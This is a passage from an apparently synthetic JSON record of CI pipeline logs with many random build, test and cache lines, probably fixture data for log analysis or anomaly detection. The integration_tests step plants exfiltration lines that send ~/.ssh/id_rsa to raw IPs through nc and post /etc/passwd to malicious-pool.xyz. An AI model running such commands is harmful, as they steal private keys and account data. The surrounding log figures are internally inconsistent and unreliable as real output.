          "Switched to branch 'hotfix/task-999'",
          "Snapshots: 2 passed, 5 total",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "Image pulled successfully",
          "Using Python 3.12",
          "Pushing to registry...",
          "[12:47:48] ERROR: Connection failed",
          "Done.",
          "[12:47:48] DEBUG: Query executed in 82ms",
          "Time: 40.192s",
          "pip: Downloading prettier-2.14.tar.gz",
          "Snapshots: 4 passed, 48 total",
          "  PASS: test_db_connect (432ms)",
          "[12:47:48] INFO: Request completed",
          "Done.",
          "Installing axios@5.1.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "TLS handshake completed",
          "Generating source maps...",
          "Compiling components/service.java...",
          "Ran 66 tests in 52s",
          "HEAD is now at 40e0520",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Image pulled successfully",
          "HEAD is now at fd08a52",
          "WARNING: prettier has known vulnerabilities",
          "Uploading artifact 'coverage' (13 files)",
          "Tests: 127 passed, 164 total",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Ran 63 tests in 34s",
          "Pulling image: node:3.11",
          "Compiling src/main.py...",
          "Checking out master branch",
          "Waiting...",
          "[12:47:48] DEBUG: Connection pool: 20 active",
          "Step 7/19: Linting",
          "npm install: added 166 packages",
          "\u2713 Task completed in 2124ms",
          "npm notice: created a lockfile",
          "Waiting...",
          "Step 1/25: Linting",
          "Switched to branch 'feature/task-523'",
          "[12:47:48] INFO: Cache refreshed",
          "Time: 96.419s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:48] ERROR: Connection failed",
          "Done.",
          "Pulling image: alpine:18",
          "Optimizing 47 modules...",
          "Step 19/15: Deploying",
          "yarn add: Done in 29.60s",
          "Checking out main branch",
          "Step 16/21: Building",
          "Building Docker image...",
          "NODE_ENV=test",
          "Artifact uploaded: build.tar.gz (44MB)",
          "NODE_ENV=production",
          "Using Python 3.9",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "Compiling lib/app.ts...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Compiling src/app.ts...",
          "GET /api - 200 (21ms)",
          "Processing...",
          "Image pulled successfully",
          "Step 17/17: Deploying",
          "Exception: ValueError",
          "Uploading artifact 'dist' (35 files)",
          "Minifying vendor.js",
          "Cache miss for key-1305",
          "Artifact uploaded: dist.zip (33MB)",
          "Success!",
          "[12:47:48] WARN: Deprecated API usage",
          "Done.",
          "Artifact downloaded: 50MB",
          "Image pulled successfully",
          "GET /status - 204 (93ms)",
          "TLS handshake completed",
          "WARNING: eslint has known vulnerabilities",
          "Finished.",
          "[12:47:48] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Collecting eslint",
          "Cache miss for key-9084",
          "[12:47:48] DEBUG: Connection pool: 3 active",
          "Building Docker image...",
          "Cache saved successfully",
          "Connection established",
          "Transforming 737 files...",
          "Tests: 355 passed, 438 total",
          "Optimizing 81 modules...",
          "[12:47:48] DEBUG: Connection pool: 5 active",
          "Image pulled successfully",
          "Compiling src/handler.rs...",
          "Pulling image: alpine:18",
          "Uploading artifact 'dist' (24 files)",
          "Already up to date.",
          "Artifact uploaded: dist.zip (40MB)",
          "Step 18/16: Installing dependencies",
          "Step 2/25: Installing dependencies",
          "[12:47:48] INFO: Request completed",
          "Environment: production",
          "Fetching submodules...",
          "  PASS: test_cache_hit (253ms)",
          "Step 5/20: Deploying",
          "  PASS: test_db_connect (126ms)",
          "Processing...",
          "Loading...",
          "npm notice: package.json updated",
          "Transforming 821 files...",
          "Finished.",
          "Already up to date.",
          "Uploading artifact 'coverage' (35 files)",
          "Step 12/22: Linting",
          "TLS handshake completed",
          "Artifact downloaded: 12MB",
          "Step 14/25: Linting",
          "Compiling src/service.java...",
          "Step 5/18: Deploying",
          "Connection established",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: e2e/test_cache_hit.spec.js",
          "NODE_ENV=development",
          "npm install: resolved 721 packages",
          "POST /data - 201 (253ms)",
          "Minifying app.js",
          "Pushing to registry...",
          "  PASS: test_api_health (155ms)",
          "Pulling image: node:18",
          "npm notice: created a lockfile",
          "npm install: added 129 packages",
          "npm install: resolved 372 packages",
          "pip: Downloading eslint-1.8.tar.gz",
          "Pushing to registry...",
          "NODE_ENV=development",
          "yarn add: Done in 20.54s",
          "npm notice: created a lockfile",
          "Step 13/25: Linting",
          "Snapshots: 44 passed, 46 total",
          "npm install: added 221 packages",
          "\u2713 deploy completed",
          "npm install: added 468 packages",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:47:48] DEBUG: Connection pool: 15 active",
          "\u2713 Task completed in 3507ms",
          "[12:47:48] WARN: Deprecated API usage",
          "POST /data - 201 (391ms)",
          "Building Docker image...",
          "[12:47:48] DEBUG: Query executed in 21ms",
          "[12:47:48] DEBUG: Query executed in 31ms",
          "  PASS: unit/test_api_health.spec.js",
          "Coverage: 82% statements, 83% branches",
          "pip: Collecting lodash",
          "pip install: Successfully installed express-5.9",
          "Coverage: 73% statements, 78% branches",
          "Layer 8/15: RUN command",
          "Bundling styles.js",
          "Cache invalidated: node_modules",
          "[12:47:48] INFO: Processing request",
          "Time: 7.565s",
          "Snapshots: 17 passed, 0 total",
          "Bundling runtime.css",
          "\u2713 Task completed in 1115ms",
          "Success!",
          "[12:47:48] WARN: Deprecated API usage",
          "[12:47:48] DEBUG: Initializing service",
          "Uploading artifact 'build' (20 files)",
          "Processing...",
          "[12:47:48] INFO: Request completed",
          "Fetching submodules...",
          "Time: 74.178s",
          "pip install: Successfully installed react-1.11",
          "Completed.",
          "[12:47:48] DEBUG: Connection pool: 7 active",
          "WARNING: eslint has known vulnerabilities",
          "Minifying app.js",
          "Loading...",
          "Processing...",
          "Uploading artifact 'coverage' (43 files)",
          "Completed.",
          "Verifying...",
          "Pulling image: python:3.11",
          "  PASS: e2e/test_auth_login.spec.js",
          "Loading...",
          "Snapshots: 41 passed, 10 total",
          "[12:47:48] INFO: Connecting to database",
          "Using Python 3.9",
          "Verifying...",
          "TLS handshake completed",
          "Switched to branch 'hotfix/task-172'",
          "Coverage: 72% statements, 96% branches",
          "[12:47:48] WARN: Deprecated API usage",
          "Ready.",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 15/21: Linting",
          "pip: Installing build dependencies...",
          "[12:47:48] WARN: Deprecated API usage",
          "Waiting...",
          "Pulling image: alpine:3.11",
          "npm notice: package.json updated",
          "Snapshots: 3 passed, 33 total",
          "OK",
          "Creating production build...",
          "Creating production build...",
          "Step 14/23: Running migrations",
          "[12:47:48] DEBUG: Query executed in 50ms",
          "Ran 90 tests in 25s",
          "WARNING: axios has known vulnerabilities",
          "[12:47:48] DEBUG: Connection pool: 6 active",
          "Artifact downloaded: 3MB",
          "Installing prettier@4.10.4",
          "WARNING: lodash has known vulnerabilities",
          "GET /health - 200 (96ms)",
          "\u2713 Step 'setup' succeeded",
          "npm notice: package.json updated",
          "yarn add: Done in 24.87s",
          "NODE_ENV=development",
          "Tests: 166 passed, 131 total",
          "POST /api - 202 (435ms)",
          "Pulling image: node:latest",
          "Test Suites: 12 passed, 38 total",
          "WARNING: prettier has known vulnerabilities",
          "[12:47:48] INFO: Starting build process",
          "Compiling lib/service.java...",
          "Time: 71.877s",
          "pip install: Successfully installed eslint-3.0",
          "Step 12/22: Installing dependencies",
          "Step 15/25: Testing",
          "Loading...",
          "Cache saved successfully",
          "Optimizing 78 modules...",
          "npm notice: created a lockfile",
          "Completed.",
          "OK",
          "[12:47:48] INFO: Starting build process",
          "Transforming 988 files...",
          "Using Python 3.11",
          "pip: Collecting jest",
          "Snapshots: 24 passed, 34 total",
          "Using Node.js 15.12.8",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 13/16: Running migrations",
          "[12:47:48] INFO: Request completed",
          "\u2713 Step 'install' succeeded",
          "Artifact uploaded: dist.zip (49MB)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-11T12:51:08.236433",
        "finished_at": "2025-12-11T12:51:27.454259",
        "log_lines": [
          "=== Step: type_check ===",
          "Switched to branch 'hotfix/task-656'",
          "Step 20/19: Running migrations",
          "[12:47:48] INFO: Starting build process",
          "Ready.",
          "Done.",
          "Completed.",
          "\u2713 build completed",
          "Environment: development",
          "Already up to date.",
          "Layer 5/13: RUN command",
          "Transforming 342 files...",
          "Artifact downloaded: 33MB",
          "[12:47:48] INFO: Request completed",
          "Artifact downloaded: 40MB",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "[12:47:48] DEBUG: Query executed in 88ms",
          "Loading...",
          "Transforming 351 files...",
          "[12:47:48] DEBUG: Query executed in 97ms",
          "[12:47:48] DEBUG: Loading configuration",
          "yarn add: Done in 18.80s",
          "pip: Installing build dependencies...",
          "[12:47:48] WARN: Deprecated API usage",
          "Finished.",
          "[12:47:48] DEBUG: Loading configuration",
          "Processing...",
          "Building Docker image...",
          "FAILED: test_api_health",
          "Step 15/18: Deploying",
          "[12:47:48] DEBUG: Connection pool: 5 active",
          "  PASS: test_user_create (142ms)",
          "Pushing to registry...",
          "Cache saved successfully",
          "yarn add: Done in 12.8s",
          "Environment: development",
          "Checking out master branch",
          "[12:47:48] DEBUG: Initializing service",
          "Generating source maps...",
          "Loading...",
          "[12:47:48] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:47:48] INFO: Starting build process",
          "Step 9/21: Running migrations",
          "Ready.",
          "Bundling styles.js",
          "pip: Installing build dependencies...",
          "Pulling image: alpine:latest",
          "[12:47:48] INFO: Request completed",
          "npm notice: created a lockfile",
          "Success!",
          "Cache hit for key-1941",
          "HEAD is now at 715fb1d",
          "Connection established",
          "NODE_ENV=development",
          "Compiling src/main.py...",
          "pip install: Successfully installed lodash-4.4",
          "Building Docker image...",
          "[12:47:48] DEBUG: Query executed in 12ms",
          "[12:47:48] INFO: Starting build process",
          "Loading...",
          "Layer 5/14: ENV command",
          "Installing jest@5.3.5",
          "Fetching from https://googleapis.com/package.json",
          "Coverage: 77% statements, 99% branches",
          "Step 11/19: Deploying",
          "Platform: win32-x64",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:48] DEBUG: Connection pool: 15 active",
          "Step 5/25: Deploying",
          "FAILED: test_auth_login",
          "Time: 49.591s",
          "Step 8/23: Running migrations",
          "Artifact downloaded: 20MB",
          "\u2713 Task completed in 1020ms",
          "Exception: ValueError",
          "FAILED: test_user_create",
          "[12:47:48] WARN: Deprecated API usage",
          "npm install: added 480 packages",
          "pip install: Successfully installed axios-2.15",
          "Processing...",
          "Step 16/25: Running migrations",
          "Finished.",
          "Time: 79.540s",
          "[12:47:48] INFO: Request completed",
          "[12:47:48] INFO: Request completed",
          "Step 2/22: Testing",
          "Cache hit for key-1189",
          "Cache hit for key-9422",
          "pip: Collecting react",
          "Layer 4/9: ENV command",
          "Pulling image: node:latest",
          "pip install: Successfully installed jest-3.20",
          "Fetching from https://pypi.org/package.json",
          "\u2713 validate completed",
          "Ran 150 tests in 33s",
          "[12:47:48] INFO: Request completed",
          "Time: 64.709s",
          "Compiling components/app.ts...",
          "Verifying...",
          "Time: 82.143s",
          "Cache miss for key-5719",
          "Compiling components/index.js...",
          "Switched to branch 'feature/task-843'",
          "Processing...",
          "Time: 38.286s",
          "Layer 8/15: RUN command",
          "Fetching submodules...",
          "[12:47:48] INFO: Connecting to database",
          "[12:47:48] WARN: Deprecated API usage",
          "[12:47:48] ERROR: Connection failed",
          "Cache miss for key-5266",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "OK",
          "Snapshots: 22 passed, 24 total",
          "Installing jest@3.2.3",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: dist.zip (11MB)",
          "Using Python 3.12",
          "Artifact uploaded: build.tar.gz (36MB)",
          "npm install: added 479 packages",
          "Generating source maps...",
          "[12:47:48] INFO: Request completed",
          "POST /upload - 201 (450ms)",
          "Snapshots: 46 passed, 27 total",
          "Snapshots: 37 passed, 38 total",
          "Step 10/18: Building",
          "HEAD is now at 7a000c5",
          "Switched to branch 'feature/task-396'",
          "Pushing to registry...",
          "TLS handshake completed",
          "Uploading artifact 'coverage' (2 files)",
          "Compiling src/index.js...",
          "pip: Downloading prettier-4.14.tar.gz",
          "Bundling main.css",
          "FAILED: test_cache_hit",
          "[12:47:48] INFO: Starting build process",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "[12:47:48] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (48MB)",
          "Completed.",
          "\u2713 Step 'install' succeeded",
          "\u2717 build failed with exit code 82",
          "Image pulled successfully",
          "Cache restored successfully (182MB)",
          "\u2713 lint completed",
          "Step 10/22: Building",
          "Already up to date.",
          "Done.",
          "Using Node.js 14.15.10",
          "Compiling utils/service.java...",
          "Ready.",
          "Step 12/17: Linting",
          "WARNING: axios has known vulnerabilities",
          "Exception: ValueError",
          "Step 2/25: Running migrations",
          "[12:47:48] INFO: Processing request",
          "\u2713 Task completed in 703ms",
          "[12:47:48] DEBUG: Connection pool: 15 active",
          "Pulling image: alpine:latest",
          "Switched to branch 'feature/task-612'",
          "Finished.",
          "Step 1/23: Building",
          "Cache hit for key-9376",
          "[12:47:48] WARN: Deprecated API usage",
          "Compiling utils/utils.go...",
          "[12:47:48] WARN: Deprecated API usage",
          "Creating production build...",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Bundling styles.css",
          "Platform: darwin-arm64",
          "[12:47:48] DEBUG: Connection pool: 3 active",
          "[12:47:48] DEBUG: Memory usage: 333MB",
          "Ran 158 tests in 8s",
          "Optimizing 99 modules...",
          "yarn add: Done in 20.6s",
          "Already up to date.",
          "[12:47:48] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Bundling runtime.js",
          "npm notice: package.json updated",
          "Step 13/25: Running migrations",
          "\u2713 All checks passed",
          "Minifying main.js",
          "Artifact downloaded: 6MB",
          "Step 14/20: Installing dependencies",
          "WARNING: react has known vulnerabilities",
          "Creating production build...",
          "Ready.",
          "Installing webpack@5.3.4",
          "POST /upload - 202 (481ms)",
          "Fetching submodules...",
          "[12:47:48] DEBUG: Loading configuration",
          "Ran 134 tests in 14s",
          "Artifact downloaded: 47MB",
          "Layer 8/12: COPY command",
          "Fetching from https://googleapis.com/package.json",
          "Exception: NullPointerException",
          "\u2713 Step 'build' succeeded",
          "[12:47:48] ERROR: Connection failed",
          "Cache invalidated: build",
          "Tests: 470 passed, 118 total",
          "Image pulled successfully",
          "Compiling lib/handler.rs...",
          "Cache miss for key-8970",
          "  PASS: test_cache_hit (177ms)",
          "[12:47:48] WARN: Deprecated API usage",
          "Cache miss for key-2134",
          "  PASS: test_api_health (22ms)",
          "Done.",
          "Processing...",
          "Optimizing 26 modules...",
          "NODE_ENV=test",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 17/22: Running migrations",
          "Uploading artifact 'build' (14 files)",
          "Using Node.js 17.5.4",
          "Fetching submodules...",
          "Using Python 3.9",
          "Checking out master branch",
          "Switched to branch 'feature/task-593'",
          "Completed.",
          "  PASS: unit/test_db_connect.spec.js",
          "Step 4/25: Running migrations",
          "\u2713 All checks passed",
          "Finished.",
          "Cache miss for key-3550",
          "Coverage: 99% statements, 98% branches",
          "NODE_ENV=production",
          "Switched to branch 'hotfix/task-452'",
          "WARNING: lodash has known vulnerabilities",
          "yarn add: Done in 18.29s",
          "[12:47:48] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Ran 23 tests in 47s",
          "HEAD is now at 0324ff9",
          "WARNING: lodash has known vulnerabilities",
          "Completed.",
          "Already up to date.",
          "Step 12/25: Installing dependencies",
          "Pushing to registry...",
          "Coverage: 92% statements, 63% branches",
          "Coverage: 87% statements, 73% branches",
          "Ready.",
          "Verifying...",
          "[12:47:48] INFO: Cache refreshed",
          "pip install: Successfully installed react-2.0",
          "Environment: staging",
          "Test Suites: 13 passed, 36 total",
          "NODE_ENV=test",
          "[12:47:48] INFO: Processing request",
          "Step 3/22: Testing",
          "Compiling lib/main.py...",
          "Verifying...",
          "[12:47:48] DEBUG: Query executed in 87ms",
          "Loading...",
          "Connection established",
          "Uploading artifact 'build' (43 files)",
          "Done.",
          "OK",
          "[12:47:48] INFO: Cache refreshed",
          "yarn add: Done in 29.9s",
          "Ready.",
          "Cache miss for key-6206",
          "Compiling src/main.py...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-11T12:51:27.454259",
        "finished_at": "2025-12-11T12:51:46.672085",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Environment: development",
          "Loading...",
          "Loading...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:47:48] INFO: Request completed",
          "Cache hit for key-4450",
          "  PASS: test_api_health (377ms)",
          "Bundling runtime.css",
          "Checking out develop branch",
          "Creating production build...",
          "Time: 89.326s",
          "Compiling lib/service.java...",
          "[12:47:48] INFO: Cache refreshed",
          "TLS handshake completed",
          "Fetching submodules...",
          "Step 1/25: Building",
          "OK",
          "[12:47:48] INFO: Processing request",
          "Step 17/23: Building",
          "Cache hit for key-2257",
          "Fetching from https://npmjs.org/package.json",
          "Coverage: 71% statements, 87% branches",
          "Artifact uploaded: dist.zip (14MB)",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: dist.zip (80MB)",
          "Snapshots: 37 passed, 18 total",
          "Coverage: 88% statements, 92% branches",
          "Fetching from https://github.com/package.json",
          "Step 18/22: Running migrations",
          "npm install: resolved 1422 packages",
          "Time: 36.696s",
          "Transforming 427 files...",
          "POST /upload - 201 (255ms)",
          "[12:47:48] ERROR: Connection failed",
          "Pushing to registry...",
          "Using Node.js 16.0.8",
          "Step 10/19: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/app.ts...",
          "Bundling runtime.css",
          "HEAD is now at ae58620",
          "\u2717 build failed with exit code 97",
          "Compiling src/handler.rs...",
          "WARNING: eslint has known vulnerabilities",
          "Ran 96 tests in 42s",
          "Done.",
          "Tests: 61 passed, 493 total",
          "Bundling styles.js",
          "npm install: added 19 packages",
          "Step 7/20: Installing dependencies",
          "Coverage: 71% statements, 60% branches",
          "\u2713 deploy completed",
          "Cache invalidated: dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/main.py...",
          "Step 16/25: Linting",
          "Cache hit for key-6894",
          "Transforming 326 files...",
          "NODE_ENV=test",
          "Loading...",
          "Step 19/21: Linting",
          "Image pulled successfully",
          "Bundling runtime.css",
          "  PASS: test_api_health (470ms)",
          "\u2713 All checks passed",
          "Step 3/25: Deploying",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: build",
          "\u2713 All checks passed",
          "Ran 103 tests in 28s",
          "Minifying app.js",
          "Uploading artifact 'dist' (20 files)",
          "WARNING: express has known vulnerabilities",
          "Coverage: 70% statements, 82% branches",
          "[12:47:48] INFO: Request completed",
          "Image pulled successfully",
          "Step 3/15: Deploying",
          "Coverage: 91% statements, 92% branches",
          "Generating source maps...",
          "Ready.",
          "pip: Downloading jest-4.9.tar.gz",
          "[12:47:48] DEBUG: Initializing service",
          "Generating source maps...",
          "Artifact downloaded: 9MB",
          "OK",
          "[12:47:48] DEBUG: Query executed in 58ms",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 73 modules...",
          "TLS handshake completed",
          "OK",
          "yarn add: Done in 20.32s",
          "[12:47:48] INFO: Request completed",
          "Environment: production",
          "\u2713 Task completed in 1664ms",
          "Cache hit for key-1472",
          "Switched to branch 'bugfix/task-592'",
          "Connection established",
          "[12:47:48] DEBUG: Loading configuration",
          "Compiling utils/utils.go...",
          "[12:47:48] DEBUG: Query executed in 59ms",
          "Compiling src/utils.go...",
          "Minifying main.js",
          "Environment: staging",
          "Ran 198 tests in 16s",
          "[12:47:48] INFO: Processing request",
          "Compiling components/service.java...",
          "Step 3/25: Building",
          "Fetching submodules...",
          "Fetching submodules...",
          "Pushing to registry...",
          "Cache restored successfully (89MB)",
          "Step 13/16: Installing dependencies",
          "Creating production build...",
          "Optimizing 27 modules...",
          "pip install: Successfully installed webpack-3.8",
          "Test Suites: 37 passed, 8 total",
          "Building Docker image...",
          "[12:47:48] DEBUG: Initializing service",
          "Using Python 3.10",
          "Artifact downloaded: 25MB",
          "Cache hit for key-5695",
          "NODE_ENV=production",
          "Waiting...",
          "Switched to branch 'hotfix/task-718'",
          "Already up to date.",
          "Done.",
          "[12:47:48] WARN: Deprecated API usage",
          "Building Docker image...",
          "[12:47:48] DEBUG: Loading configuration",
          "npm install: resolved 678 packages",
          "Switched to branch 'bugfix/task-254'",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling components/utils.go...",
          "Generating source maps...",
          "Compiling components/service.java...",
          "Minifying vendor.js",
          "yarn add: Done in 9.45s",
          "Checking out develop branch",
          "Installing axios@4.3.8",
          "\u2713 validate completed",
          "Loading...",
          "Ran 143 tests in 16s",
          "WARNING: react has known vulnerabilities",
          "yarn add: Done in 25.17s",
          "Checking out develop branch",
          "Time: 36.924s",
          "npm install: added 184 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/19: Installing dependencies",
          "Step 19/15: Linting",
          "Image pulled successfully",
          "Already up to date.",
          "Cache invalidated: build",
          "Processing...",
          "Pulling image: node:latest",
          "Exception: ValueError",
          "[12:47:48] INFO: Connecting to database",
          "npm install: added 363 packages",
          "[12:47:48] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: jest has known vulnerabilities",
          "  PASS: e2e/test_cache_hit.spec.js",
          "GET /api - 200 (63ms)",
          "pip: Collecting react",
          "[12:47:48] INFO: Request completed",
          "Ran 138 tests in 58s",
          "Ran 16 tests in 20s",
          "[12:47:48] INFO: Processing request",
          "Processing...",
          "Loading...",
          "Step 7/18: Deploying",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "  PASS: test_auth_login (317ms)",
          "Step 20/23: Building",
          "Compiling src/utils.go...",
          "\u2713 validate completed",
          "Test Suites: 16 passed, 42 total",
          "Done.",
          "GET /health - 204 (98ms)",
          "[12:47:48] INFO: Processing request",
          "Verifying...",
          "\u2713 Task completed in 3188ms",
          "\u2717 build failed with exit code 21",
          "Image pulled successfully",
          "Completed.",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:48] DEBUG: Initializing service",
          "[12:47:48] DEBUG: Loading configuration",
          "  PASS: test_cache_hit (284ms)",
          "Ran 62 tests in 20s",
          "Done.",
          "Compiling src/index.js...",
          "HEAD is now at a305d4a",
          "Finished.",
          "[12:47:48] WARN: Deprecated API usage",
          "Tests: 429 passed, 321 total",
          "Switched to branch 'hotfix/task-673'",
          "pip: Downloading prettier-3.18.tar.gz",
          "Compiling components/service.java...",
          "Step 1/23: Installing dependencies",
          "WARNING: prettier has known vulnerabilities",
          "Using Python 3.9",
          "npm install: added 48 packages",
          "yarn add: Done in 23.13s",
          "[12:47:48] INFO: Connecting to database",
          "[12:47:48] DEBUG: Loading configuration",
          "Compiling utils/service.java...",
          "Test Suites: 31 passed, 23 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:48] DEBUG: Loading configuration",
          "npm install: added 43 packages",
          "[12:47:48] INFO: Processing request",
          "\u2713 Task completed in 4197ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Platform: win32-x64",
          "OK",
          "Test Suites: 36 passed, 35 total",
          "[12:47:48] DEBUG: Initializing service",
          "Connection established",
          "Layer 10/8: RUN command",
          "[12:47:48] INFO: Processing request",
          "  PASS: test_cache_hit (161ms)",
          "Artifact downloaded: 1MB",
          "Image pulled successfully",
          "Waiting...",
          "pip: Collecting prettier",
          "Verifying...",
          "WARNING: axios has known vulnerabilities",
          "Step 7/17: Testing",
          "yarn add: Done in 19.89s",
          "Step 12/24: Installing dependencies",
          "Test Suites: 48 passed, 22 total",
          "Completed.",
          "Snapshots: 49 passed, 42 total",
          "Coverage: 85% statements, 78% branches",
          "[12:47:48] DEBUG: Query executed in 49ms",
          "Step 9/23: Linting",
          "Step 7/25: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 3320ms",
          "Step 11/15: Deploying",
          "Waiting...",
          "Verifying...",
          "Cache saved successfully",
          "Environment: test",
          "Snapshots: 8 passed, 39 total",
          "Connection established",
          "Bundling runtime.js",
          "pip: Collecting eslint",
          "Completed.",
          "Artifact downloaded: 8MB",
          "[12:47:48] DEBUG: Query executed in 50ms",
          "Using Python 3.12",
          "[12:47:48] DEBUG: Query executed in 63ms",
          "Checking out main branch",
          "[12:47:48] INFO: Cache refreshed",
          "Bundling vendor.js",
          "[12:47:48] WARN: Deprecated API usage",
          "[12:47:48] WARN: Deprecated API usage",
          "Cache miss for key-6306",
          "Cache invalidated: build",
          "Artifact uploaded: dist.zip (21MB)",
          "Switched to branch 'hotfix/task-877'",
          "Loading...",
          "npm install: added 127 packages",
          "Success!",
          "Optimizing 12 modules...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-11T12:51:46.672085",
        "finished_at": "2025-12-11T12:52:25.107737",
        "log_lines": [
          "=== Step: integration_tests ===",
          "npm notice: created a lockfile",
          "NODE_ENV=production",
          "Platform: win32-x64",
          "Step 20/24: Building",
          "Compiling src/app.ts...",
          "GET /status - 201 (40ms)",
          "Layer 2/11: RUN command",
          "Compiling src/handler.rs...",
          "[12:47:48] INFO: Processing request",
          "[12:47:48] INFO: Request completed",
          "Compiling src/main.py...",
          "Installing express@3.6.9",
          "Step 13/16: Installing dependencies",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 135.49.37.11 62881",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "Compiling src/app.ts...",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 62",
          "Tests: 115 passed, 400 total",
          "Uploading artifact 'build' (45 files)",
          "\u2713 Task completed in 3111ms",
          "Done.",
          "FAILED: test_api_health",
          "Environment: test",
          "Finished.",
          "Coverage: 87% statements, 93% branches",
          "Layer 4/9: ENV command",
          "Using Python 3.9",
          "[12:47:48] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Step 9/16: Linting",
          "Switched to branch 'bugfix/task-100'",
          "Waiting...",
          "Coverage: 71% statements, 64% branches",
          "HEAD is now at 1bd0f81",
          "[12:47:48] INFO: Processing request",
          "Generating source maps...",
          "Compiling utils/app.ts...",
          "Snapshots: 17 passed, 35 total",
          "  PASS: test_user_create (313ms)",
          "Compiling utils/index.js...",
          "Installing jest@5.1.3",
          "Waiting...",
          "Switched to branch 'feature/task-333'",
          "Step 2/23: Linting",
          "Sending 431MB of data to malicious-pool.xyz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/index.js...",
          "Processing...",
          "Artifact downloaded: 31MB",
          "[12:47:48] INFO: Starting build process",
          "Image pulled successfully",
          "Step 8/24: Building",
          "Uploading artifact 'build' (36 files)",
          "npm install: resolved 166 packages",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 66.43.143.131 60972",
          "NODE_ENV=production",
          "Checking out develop branch",
          "[12:47:48] ERROR: Connection failed",
          "Cache miss for key-5471",
          "Checking out main branch",
          "Building Docker image...",
          "  PASS: e2e/test_user_create.spec.js",
          "Done.",
          "npm install: added 377 packages",
          "Using Python 3.9",
          "[12:47:48] WARN: Deprecated API usage",
          "\u2713 Step 'build' succeeded",
          "OK",
          "Uploading artifact 'dist' (50 files)",
          "  PASS: unit/test_api_health.spec.js",
          "Pulling image: node:18",
          "\u2713 Step 'install' succeeded",
          "\u2713 All checks passed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "pip: Downloading webpack-5.7.tar.gz",
          "yarn add: Done in 9.75s",
          "Building Docker image...",
          "Sending 140MB of data to evil-server.cc",
          "Environment: development",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 230.75.149.29 10904",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 255.111.227.127 26294",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Platform: win32-x64",
          "WARNING: express has known vulnerabilities",
          "Compiling src/service.java...",
          "Using Python 3.11",
          "Step 11/20: Deploying",
          "Completed.",
          "yarn add: Done in 24.53s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 75 modules...",
          "Compiling src/utils.go...",
          "npm install: resolved 1046 packages",
          "Cache restored successfully (229MB)",
          "[12:47:48] ERROR: Connection failed",
          "Success!",
          "Using Python 3.12",
          "TLS handshake completed",
          "[12:47:48] DEBUG: Connection pool: 4 active",
          "[12:47:48] INFO: Request completed",
          "Step 16/19: Deploying",
          "\u2713 Step 'build' succeeded",
          "Cache invalidated: node_modules",
          "Exception: NullPointerException",
          "Success!",
          "Using Python 3.9",
          "Bundling runtime.css",
          "Cache invalidated: build",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Tests: 408 passed, 461 total",
          "Building Docker image...",
          "Step 12/25: Testing",
          "Step 1/25: Testing",
          "pip: Collecting webpack",
          "Pulling image: python:latest",
          "GET /api - 201 (40ms)",
